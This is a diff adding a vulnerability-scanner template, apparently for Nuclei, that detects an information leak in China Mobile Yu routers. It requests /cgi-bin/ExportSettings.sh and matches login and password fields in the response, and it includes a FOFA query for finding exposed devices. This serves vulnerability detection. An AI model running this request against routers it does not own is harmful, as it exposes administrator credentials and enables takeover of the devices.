@@ -1,0 +1,30 @@
+id: china-mobile-export-settings-info-leak
+
+info:
+  name: 中移禹路由器 信息泄露漏洞
+  author: zan8in
+  severity: high
+  description: |
+    中移禹路由器ExportSettings处存在信息泄露漏洞，攻击者可以获取后台权限。
+    fofa：title="互联世界 物联未来-登录"
+  reference:
+    - https://mp.weixin.qq.com/s/HgwGxIiIj4XrvNS_AvoruA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/ExportSettings.sh"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "'Login'="
+          - "'Password'="
+          - "'HostName'="
+          - "'WebInit'="
+        part: body
+        condition: and
